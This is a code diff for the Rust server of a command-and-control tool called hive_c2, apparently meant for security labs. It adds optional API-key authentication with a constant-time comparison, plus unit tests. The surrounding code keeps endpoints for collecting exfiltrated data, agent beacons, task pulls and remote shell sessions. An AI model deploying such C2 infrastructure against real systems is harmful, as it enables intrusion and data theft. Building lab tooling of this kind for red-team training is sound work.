@@ -10,6 +10,7 @@ use std::sync::Arc;
 use axum::{
     extract::{Path, Query, State, WebSocketUpgrade},
     http::StatusCode,
+    middleware,
     response::{Html, IntoResponse, Json},
     routing::{get, post},
     Router,
@@ -37,6 +38,12 @@ struct Args {
 
     #[arg(long, default_value = "hive_c2.db")]
     db_path: PathBuf,
+
+    /// Require the `x-api-key` header on agent/operator endpoints.
+    /// Empty (default) disables authentication — retro-compatible with
+    /// existing labs. `/` and `/health` always stay open for monitoring.
+    #[arg(long, default_value = "")]
+    api_key: String,
 }
 
 #[derive(Clone)]
@@ -45,6 +52,9 @@ struct AppState {
     sessions: Arc<Mutex<SessionManager>>,
     relay: shell::RelayMap,
     loot_dir: PathBuf,
+    /// When non-empty, agent/operator endpoints require the `x-api-key`
+    /// header to match this value (constant-time comparison).
+    api_key: String,
 }
 
 #[derive(Serialize)]
@@ -124,11 +134,18 @@ async fn main() {
         sessions: Arc::new(Mutex::new(sessions)),
         relay: Arc::new(Mutex::new(HashMap::new())),
         loot_dir: args.loot_dir,
+        api_key: args.api_key,
     };
 
-    let app = Router::new()
+    // Public routes: liveness/monitoring stay reachable without a key so
+    // `hive.sh status` and dashboards keep working unauthenticated.
+    let public = Router::new()
         .route("/health", get(health_handler))
         .route("/", get(index_handler))
+        .with_state(state.clone());
+
+    // Agent/operator routes: optionally guarded by the `x-api-key` header.
+    let protected = Router::new()
         .route("/logs", get(logs_handler))
         .route("/collect", post(collect_handler))
         .route("/beacon", post(beacon_handler))
@@ -137,11 +154,24 @@ async fn main() {
         .route("/shell/:session_id", get(shell_handler))
         .route("/admin/sessions", get(admin_sessions_handler))
         .route("/admin/agents", get(admin_agents_handler))
+        .layer(middleware::from_fn_with_state(
+            state.clone(),
+            auth_middleware,
+        ))
         .layer(CorsLayer::permissive())
-        .with_state(state);
+        .with_state(state.clone());
+
+    let app = public.merge(protected);
 
     let addr = SocketAddr::new(args.host.parse().expect("Invalid host address"), args.port);
     tracing::info!("C2 Server listening on http://{addr}");
+    if state.api_key.is_empty() {
+        tracing::warn!(
+            "API authentication DISABLED (start with --api-key <secret> to require x-api-key)"
+        );
+    } else {
+        tracing::info!("API authentication ENABLED — agents must send the x-api-key header");
+    }
     tracing::info!("  POST /collect   - Receive exfiltrated data");
     tracing::info!("  POST /beacon    - Agent heartbeats");
     tracing::info!("  GET  /task/:id  - Task pull");
@@ -151,6 +181,51 @@ async fn main() {
 
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
     axum::serve(listener, app).await.unwrap();
+}
+
+/// Middleware that enforces the optional `x-api-key` check.
+///
+/// When no API key is configured the request passes through untouched,
+/// preserving the historical zero-config lab behaviour.
+async fn auth_middleware(
+    State(state): State<AppState>,
+    req: axum::extract::Request,
+    next: middleware::Next,
+) -> Result<axum::response::Response, StatusCode> {
+    if state.api_key.is_empty() {
+        return Ok(next.run(req).await);
+    }
+    let provided = req
+        .headers()
+        .get("x-api-key")
+        .and_then(|v| v.to_str().ok());
+    if !api_key_matches(&state.api_key, provided) {
+        tracing::warn!(path = %req.uri().path(), "Rejected request: missing/invalid x-api-key");
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    Ok(next.run(req).await)
+}
+
+/// Compare a provided API key against the configured one.
+///
+/// Both sides are hashed with SHA-256 and the digests are folded with XOR
+/// so the comparison time does not depend on where the bytes differ
+/// (cheap constant-time check without extra dependencies).
+fn api_key_matches(expected: &str, provided: Option<&str>) -> bool {
+    let Some(provided) = provided else {
+        return false;
+    };
+    if provided.is_empty() {
+        return false;
+    }
+    use sha2::{Digest, Sha256};
+    let h_expected = Sha256::digest(expected.as_bytes());
+    let h_provided = Sha256::digest(provided.as_bytes());
+    h_expected
+        .iter()
+        .zip(h_provided.iter())
+        .fold(0u8, |acc, (a, b)| acc | (a ^ b))
+        == 0
 }
 
 async fn health_handler(State(state): State<AppState>) -> Json<HealthResponse> {
@@ -363,4 +438,31 @@ async fn admin_sessions_handler(State(state): State<AppState>) -> Json<Vec<shell
 async fn admin_agents_handler(State(state): State<AppState>) -> Json<serde_json::Value> {
     let db = state.db.lock().await;
     Json(db.agent_summary())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn api_key_disabled_when_empty() {
+        // An empty configured key means "auth off"; the middleware short-
+        // circuits, but the matcher itself must still be conservative.
+        assert!(!api_key_matches("", Some("anything")));
+        assert!(!api_key_matches("", None));
+    }
+
+    #[test]
+    fn api_key_accepts_exact_match() {
+        assert!(api_key_matches("lab-secret-123", Some("lab-secret-123")));
+    }
+
+    #[test]
+    fn api_key_rejects_wrong_or_missing() {
+        assert!(!api_key_matches("lab-secret-123", Some("wrong")));
+        assert!(!api_key_matches("lab-secret-123", None));
+        assert!(!api_key_matches("lab-secret-123", Some("")));
+        // Prefixes must not authenticate.
+        assert!(!api_key_matches("lab-secret-123", Some("lab-secret")));
+    }
 }
